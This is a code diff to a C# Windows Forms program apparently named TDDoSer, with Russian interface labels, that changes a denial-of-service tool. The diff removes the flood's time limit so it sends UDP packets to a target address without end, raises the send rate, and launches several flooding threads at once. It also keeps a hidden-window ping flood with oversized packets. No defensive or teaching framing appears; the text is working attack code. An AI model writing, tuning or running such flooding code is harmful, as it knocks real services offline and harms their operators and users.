@@ -23,7 +23,7 @@ namespace TDDoSer
         private static int per = 0;
         private static int speed = 12;
         private static readonly string p = "1234567890123456789012345678901234567890";
-        private static readonly string data = p + p + p + p + p + p + p + p + p + p;
+        private static readonly string data = p + p + p + p + p + p + p + p + p + p +p +p;
         private static readonly byte[] dataBytes = Encoding.ASCII.GetBytes(data);
         private static string targetIP = "192.168.0.75";
         private static int port = 80;
@@ -36,7 +36,7 @@ namespace TDDoSer
             TextLabel.Text = Text;
 
         }
-        public async void ddToolsStart()
+        public async void ddToolsStartAsync()
         {
             await Task.Run(() =>
             {
@@ -50,55 +50,48 @@ namespace TDDoSer
                     port = int.Parse(TargetTextBox.Text.Split(':')[1]);
                 }
 
+              
                 try
                 {
-                    totalTime = 2 * 60 * 60;
+                    totalTime = 2147483646;
                 }
                 catch (Exception)
                 {
-                    totalTime = 2 * 60 * 60;
+                    totalTime = 2147483646;
                 }
-                if (totalTime > 2 * 60 * 60)
-                {
-                    totalTime = 2 * 60 * 60;
-                }
+                if (totalTime > 2 * 60 * 60) totalTime = 2 * 60 * 60;
 
                 IPEndPoint ep = new IPEndPoint(IPAddress.Parse(targetIP), port);
 
                 try
                 {
-                    speed = 999999999;
+                    speed = 2147483646;
                 }
                 catch (Exception)
                 {
 
                 }
 
-                // Console.WriteLine("Speed: " + speed);
-                packetscount++;
-                Packets.Text = packetscount.ToString();
-                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
-                {
-                    SendTimeout = 100000
-                };
+                //Console.ForegroundColor = ConsoleColor.DarkRed;
 
-                //Console.WriteLine("IP+" + targetIP + "\n Time:" + totalTime);
-                //Console.WriteLine("Sended " + Math.Round(total * data.Length / 1024 / 102.4 * 10) / 100 + " \t MB");
+                //Console.WriteLine("Скорость: " + speed);
+                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+                client.SendTimeout = 100000;
+
+                //Console.WriteLine("IP " + targetIP + "\nВремя:" + totalTime + "\n");
+                //Console.ForegroundColor = ConsoleColor.Red;
+                //Console.WriteLine("Отправил " + Math.Round(total * data.Length / 1024 / 102.4 * 10) / 100 + "\t МБ");
 
                 int logDataCounter = 0;
                 while (true)
                 {
                     per++;
+            
                     if (per > speed)
                     {
-                        Thread.Sleep(10);
+                        Thread.Sleep(2);
                         per = 0;
                     }
-                    if ((DateTime.Now - start).TotalSeconds >= totalTime)
-                    {
-                        break;
-                    }
-
                     total++;
                     logDataCounter++;
                     client.SendTo(dataBytes, ep);
@@ -133,7 +126,9 @@ namespace TDDoSer
                         Arguments = "/command ping " + TargetTextBox.Text + " -t -l 65500",
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true,
-                        UseShellExecute = false
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true,
+                        RedirectStandardInput = true
                     });
                     PSDoSPing.BeginOutputReadLine();
 
@@ -153,10 +148,14 @@ namespace TDDoSer
 
             if (ddTools.Checked == true)
             {
-
-                ddToolsStart();
-                threads++;
-                ThreadsLabel.Text = "Потоков:" + threads.ToString();
+                for (long i = ddThreads.Value; i > 0; i--)
+                {
+                    ThreadDDStart();
+                    threads++;
+                    ThreadsLabel.Text = "Потоков:" + threads.ToString();
+                }
+               
+               
             }
 
 
@@ -193,6 +192,11 @@ namespace TDDoSer
             }
         }
 
+        public void ThreadDDStart()
+        {
+            new Thread(() =>ddToolsStartAsync()).Start();
+            new Thread(() =>ddToolsStartAsync()).Start();
+        }
         private void Form1_Load(object sender, EventArgs e)
         {
             SebyaDDoSAsync();
